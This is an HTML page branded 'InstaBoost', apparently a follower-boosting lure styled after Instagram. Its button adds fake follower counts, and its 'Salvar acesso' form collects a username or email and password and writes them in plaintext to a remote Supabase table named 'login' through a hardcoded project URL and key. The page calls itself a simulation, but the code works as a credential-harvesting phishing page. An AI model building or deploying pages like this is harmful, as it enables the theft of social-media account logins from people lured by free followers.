<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
  <title>InstaBoost • Simulador de Seguidores</title>
  <!-- Fontes modernas -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
  <!-- Ícones (Lucide) -->
  <script src="https://unpkg.com/lucide@latest"></script>
  <!-- Supabase -->
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
      background: radial-gradient(circle at 20% 10%, #1a102f, #0b0716 80%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1.25rem;
      position: relative;
      overflow-x: hidden;
    }

    /* Efeitos de fundo modernos */
    body::before {
      content: "";
      position: fixed;
      inset: 0;
      background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 800" opacity="0.18"><defs><linearGradient id="grad" x1="0%25" y1="0%25" x2="100%25" y2="100%25"><stop offset="0%25" stop-color="%23a855f7"/><stop offset="100%25" stop-color="%23ec4899"/></linearGradient></defs><circle cx="300" cy="200" r="350" fill="url(%23grad)" filter="blur(80px)"/><circle cx="900" cy="600" r="400" fill="%23f97316" filter="blur(100px)" opacity="0.5"/></svg>') center/cover no-repeat;
      pointer-events: none;
      z-index: 0;
    }

    .glass-card {
      position: relative;
      z-index: 2;
      width: 100%;
      max-width: 480px;
      background: rgba(18, 15, 28, 0.7);
      backdrop-filter: blur(24px);
      -webkit-backdrop-filter: blur(24px);
      border: 1px solid rgba(255, 255, 255, 0.08);
      border-radius: 2.5rem;
      box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(168, 85, 247, 0.2) inset;
      padding: 2.25rem 1.8rem;
      transition: transform 0.2s ease;
    }

    .logo-area {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.5rem;
      margin-bottom: 2rem;
    }

    .instagram-gradient {
      background: linear-gradient(135deg, #fbbf24, #f97316, #ec4899, #a855f7);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      font-weight: 700;
      font-size: 2rem;
      letter-spacing: -0.5px;
    }

    .icon-camera {
      color: #eab308;
      filter: drop-shadow(0 0 8px #fbbf24);
    }

    .simulator-badge {
      background: rgba(255, 255, 255, 0.05);
      border-radius: 3rem;
      padding: 0.5rem 1.2rem;
      margin: 0 auto 1.8rem;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.5rem;
      border: 1px solid rgba(255, 255, 255, 0.1);
      width: fit-content;
      backdrop-filter: blur(10px);
      font-size: 0.9rem;
      color: #d1d5db;
      font-weight: 500;
    }

    .followers-counter {
      background: rgba(0, 0, 0, 0.5);
      border-radius: 2rem;
      padding: 1.8rem 1rem;
      margin-bottom: 2rem;
      text-align: center;
      border: 1px solid rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(12px);
    }

    .follower-number {
      font-size: 3.8rem;
      font-weight: 700;
      background: linear-gradient(to right, #facc15, #fb923c, #f472b6);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      line-height: 1.1;
      letter-spacing: -1px;
    }

    .label-followers {
      color: #a0a0c0;
      font-size: 0.9rem;
      text-transform: uppercase;
      letter-spacing: 2px;
      margin-top: 0.3rem;
    }

    .action-buttons {
      display: flex;
      flex-direction: column;
      gap: 0.9rem;
      margin-bottom: 2.2rem;
    }

    .btn-gain {
      background: linear-gradient(135deg, #a855f7, #ec4899);
      border: none;
      border-radius: 2.5rem;
      padding: 0.9rem;
      font-weight: 600;
      font-size: 1.1rem;
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.5rem;
      cursor: pointer;
      transition: all 0.25s;
      box-shadow: 0 8px 20px rgba(168, 85, 247, 0.35);
      letter-spacing: 0.3px;
      border: 1px solid rgba(255, 255, 255, 0.2);
    }

    .btn-gain:hover {
      transform: translateY(-2px);
      filter: brightness(1.15);
      box-shadow: 0 12px 28px rgba(236, 72, 153, 0.5);
    }

    .btn-gain:active {
      transform: translateY(2px);
    }

    .login-section {
      background: rgba(255, 255, 255, 0.04);
      border-radius: 1.8rem;
      padding: 1.6rem 1.2rem;
      backdrop-filter: blur(10px);
      border: 1px solid rgba(255, 255, 255, 0.08);
    }

    .login-title {
      color: #e2e8f0;
      font-weight: 600;
      font-size: 1rem;
      margin-bottom: 1.2rem;
      display: flex;
      align-items: center;
      gap: 0.4rem;
    }

    .input-group {
      display: flex;
      flex-direction: column;
      gap: 0.9rem;
      margin-bottom: 1.2rem;
    }

    .input-field {
      background: rgba(10, 8, 20, 0.7);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 1.2rem;
      padding: 0.85rem 1.2rem;
      color: white;
      font-size: 0.95rem;
      outline: none;
      transition: 0.2s;
      font-weight: 500;
      backdrop-filter: blur(5px);
    }

    .input-field:focus {
      border-color: #c084fc;
      box-shadow: 0 0 0 3px rgba(168, 85, 247, 0.25);
    }

    .input-field::placeholder {
      color: #7c7c9a;
      font-weight: 400;
    }

    .btn-save {
      background: rgba(255, 255, 255, 0.08);
      border: 1px solid rgba(255, 255, 255, 0.2);
      border-radius: 2rem;
      padding: 0.8rem;
      font-weight: 600;
      color: #f1f5f9;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.4rem;
      cursor: pointer;
      transition: 0.2s;
      width: 100%;
      backdrop-filter: blur(8px);
      font-size: 0.95rem;
    }

    .btn-save:hover {
      background: rgba(255, 255, 255, 0.15);
      border-color: rgba(255, 255, 255, 0.35);
    }

    .feedback-message {
      margin-top: 1rem;
      font-size: 0.85rem;
      text-align: center;
      min-height: 1.2rem;
      font-weight: 500;
    }

    .success {
      color: #86efac;
    }

    .error {
      color: #fca5a5;
    }

    .info-note {
      color: #a5b4fc;
      font-size: 0.7rem;
      margin-top: 0.8rem;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.2rem;
      opacity: 0.9;
    }

    hr {
      border-color: rgba(255, 255, 255, 0.08);
      margin: 1.2rem 0 0.8rem;
    }

    @media (max-width: 400px) {
      .glass-card {
        padding: 1.8rem 1.2rem;
      }
      .follower-number {
        font-size: 3rem;
      }
    }
  </style>
</head>
<body>
  <div class="glass-card">
    <!-- Logo / cabeçalho -->
    <div class="logo-area">
      <i data-lucide="instagram" class="icon-camera" width="32" height="32" stroke-width="2.2"></i>
      <span class="instagram-gradient">InstaBoost</span>
    </div>

    <div class="simulator-badge">
      <i data-lucide="zap" width="18" height="18" style="color: #facc15;"></i>
      <span>Simulador virtual</span>
    </div>

    <!-- Contador de seguidores -->
    <div class="followers-counter">
      <div class="follower-number" id="followerDisplay">0</div>
      <div class="label-followers">seguidores</div>
    </div>

    <!-- Botão de ganhar seguidores -->
    <div class="action-buttons">
      <button class="btn-gain" id="gainButton">
        <i data-lucide="plus-circle" width="22" height="22"></i> Ganhar seguidores
      </button>
    </div>

    <!-- Área de login / conexão Supabase -->
    <div class="login-section">
      <div class="login-title">
        <i data-lucide="user-check" width="20" height="20" style="color: #c084fc;"></i> 
        Salvar acesso
      </div>
      <div class="input-group">
        <input type="text" id="loginInput" class="input-field" placeholder="Usuário ou email" autocomplete="off">
        <input type="password" id="passwordInput" class="input-field" placeholder="Senha" autocomplete="off">
      </div>
      <button class="btn-save" id="saveLoginBtn">
        <i data-lucide="save" width="18" height="18"></i> Registrar login
      </button>
      <div id="feedbackMessage" class="feedback-message"></div>
      <div class="info-note">
        <i data-lucide="shield-check" width="14" height="14"></i> Simulação • dados no Supabase
      </div>
    </div>
    <hr>
    <div style="text-align: center; font-size: 0.7rem; color: #6b7280; margin-top: 0.4rem;">
      Apenas para demonstração · seguidores fictícios
    </div>
  </div>

  <script>
    (function() {
      // Inicializar ícones Lucide
      lucide.createIcons();

      // ---------- CONFIGURAÇÃO CORRIGIDA DO SUPABASE ----------
      // URL correta do projeto Supabase (sem "/login" no final)
      const SUPABASE_URL = "https://wlrclbwjqmnzgabiurmr.supabase.co";
      
      // Sua chave anon key (pública)
      const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndscmNsYndqcW1uemdhYml1cm1yIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg3MTU0MDMsImV4cCI6MjA5NDI5MTQwM30.-0LQBgpjjYuV7hnRiIXNMCJ9GIJrYWd7pABgcPtGfPM";

      // Inicializa o cliente Supabase com opções de fetch personalizado
      const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
        auth: {
          persistSession: false,
          autoRefreshToken: false,
        },
        // Configuração global de fetch para melhor tratamento de erros
        global: {
          fetch: (...args) => {
            return fetch(...args).catch(err => {
              console.error('Erro de rede Supabase:', err);
              throw new Error('Falha na conexão com o servidor. Verifique sua internet.');
            });
          }
        }
      });

      // Elementos da interface
      const followerDisplay = document.getElementById('followerDisplay');
      const gainButton = document.getElementById('gainButton');
      const loginInput = document.getElementById('loginInput');
      const passwordInput = document.getElementById('passwordInput');
      const saveLoginBtn = document.getElementById('saveLoginBtn');
      const feedbackDiv = document.getElementById('feedbackMessage');

      // Estado do contador de seguidores (simulado)
      let currentFollowers = 0;

      // Atualiza o número na tela com formatação
      function updateFollowerDisplay() {
        if (followerDisplay) {
          followerDisplay.textContent = currentFollowers.toLocaleString('pt-BR');
        }
      }

      // Função para ganhar seguidores (quantidade aleatória entre 50 e 350)
      function addRandomFollowers() {
        const gain = Math.floor(Math.random() * 301) + 50; // 50 a 350
        currentFollowers += gain;
        updateFollowerDisplay();

        // Pequeno efeito visual no botão
        gainButton.style.transform = 'scale(0.96)';
        setTimeout(() => {
          gainButton.style.transform = '';
        }, 120);

        // Feedback rápido
        feedbackDiv.textContent = `+${gain} seguidores adicionados!`;
        feedbackDiv.className = 'feedback-message success';
        setTimeout(() => {
          if (feedbackDiv.textContent.includes('adicionados')) {
            feedbackDiv.textContent = '';
            feedbackDiv.className = 'feedback-message';
          }
        }, 2000);
      }

      // Função para testar a conexão com o Supabase
      async function testSupabaseConnection() {
        try {
          // Tenta fazer uma consulta simples para verificar a conexão
          const { data, error } = await supabase
            .from('login')
            .select('id')
            .limit(1);
          
          if (error) {
            console.warn('Aviso de conexão:', error.message);
            return false;
          }
          
          console.log('Conexão Supabase OK');
          return true;
        } catch (err) {
          console.error('Erro ao testar conexão:', err);
          return false;
        }
      }

      // Função para salvar login e senha no Supabase
      async function saveLoginToSupabase(loginValue, senhaValue) {
        try {
          const cleanLogin = loginValue.trim();
          const cleanSenha = senhaValue.trim();

          if (!cleanLogin || !cleanSenha) {
            throw new Error('Preencha ambos os campos (login e senha).');
          }

          // Primeiro testa a conexão
          const isConnected = await testSupabaseConnection();
          if (!isConnected) {
            console.warn('Continuando mesmo com aviso de conexão...');
          }

          // Insere na tabela "login"
          const { data, error } = await supabase
            .from('login')
            .insert([
              {
                login: cleanLogin,
                senha: cleanSenha,
              }
            ])
            .select();

          if (error) {
            console.error('Erro detalhado do Supabase:', error);
            
            // Mensagens de erro mais específicas
            if (error.code === '42P01') {
              throw new Error('Tabela "login" não encontrada. Execute o SQL de criação primeiro.');
            } else if (error.code === '42501') {
              throw new Error('Permissão negada. Verifique as políticas RLS no Supabase.');
            } else if (error.message.includes('Failed to fetch')) {
              throw new Error('Erro de rede. Verifique se o Supabase está acessível.');
            } else {
              throw new Error(error.message || 'Erro ao salvar no banco de dados.');
            }
          }

          return { success: true, data };
        } catch (err) {
          console.error('Erro completo:', err);
          return { success: false, message: err.message || 'Erro desconhecido ao salvar.' };
        }
      }

      // Manipulador do clique no botão "Ganhar seguidores"
      gainButton.addEventListener('click', () => {
        addRandomFollowers();
      });

      // Manipulador do botão "Registrar login"
      saveLoginBtn.addEventListener('click', async () => {
        const login = loginInput.value;
        const senha = passwordInput.value;

        // Validação simples
        if (!login.trim() || !senha.trim()) {
          feedbackDiv.textContent = '⚠️ Informe login e senha.';
          feedbackDiv.className = 'feedback-message error';
          return;
        }

        // Mostra estado de carregamento
        saveLoginBtn.disabled = true;
        saveLoginBtn.innerHTML = '<i data-lucide="loader-2" width="18" height="18" class="spin-icon"></i> Salvando...';
        lucide.createIcons();
        
        feedbackDiv.textContent = 'Conectando ao Supabase...';
        feedbackDiv.className = 'feedback-message info-note';

        const result = await saveLoginToSupabase(login, senha);

        // Reativa botão
        saveLoginBtn.disabled = false;
        saveLoginBtn.innerHTML = '<i data-lucide="save" width="18" height="18"></i> Registrar login';
        lucide.createIcons();

        if (result.success) {
          feedbackDiv.textContent = '✅ Login salvo com sucesso!';
          feedbackDiv.className = 'feedback-message success';
          // Limpa campos após sucesso
          loginInput.value = '';
          passwordInput.value = '';
        } else {
          feedbackDiv.textContent = `❌ ${result.message || 'Erro ao salvar.'}`;
          feedbackDiv.className = 'feedback-message error';
        }

        // Limpa a mensagem após alguns segundos
        setTimeout(() => {
          if (feedbackDiv.textContent.includes('sucesso') || feedbackDiv.textContent.includes('✅')) {
            feedbackDiv.textContent = '';
            feedbackDiv.className = 'feedback-message';
          }
        }, 4000);
      });

      // Teste de conexão ao carregar a página
      window.addEventListener('load', () => {
        updateFollowerDisplay();
        
        // Testa a conexão silenciosamente
        testSupabaseConnection().then(isConnected => {
          if (!isConnected) {
            console.warn('⚠️ Não foi possível conectar ao Supabase. Verifique:');
            console.warn('1. Se a URL do projeto está correta');
            console.warn('2. Se a tabela "login" foi criada corretamente');
            console.warn('3. Se as políticas RLS permitem inserções anônimas');
          }
        });
      });

      // Suporte para tecla Enter
      passwordInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
          e.preventDefault();
          saveLoginBtn.click();
        }
      });
      
      loginInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
          e.preventDefault();
          passwordInput.focus();
        }
      });

      // Estilo para animação de carregamento
      const styleSheet = document.createElement("style");
      styleSheet.textContent = `
        .spin-icon {
          animation: spin 0.9s linear infinite;
        }
        @keyframes spin {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
      `;
      document.head.appendChild(styleSheet);
    })();
  </script>
</body>
</html>
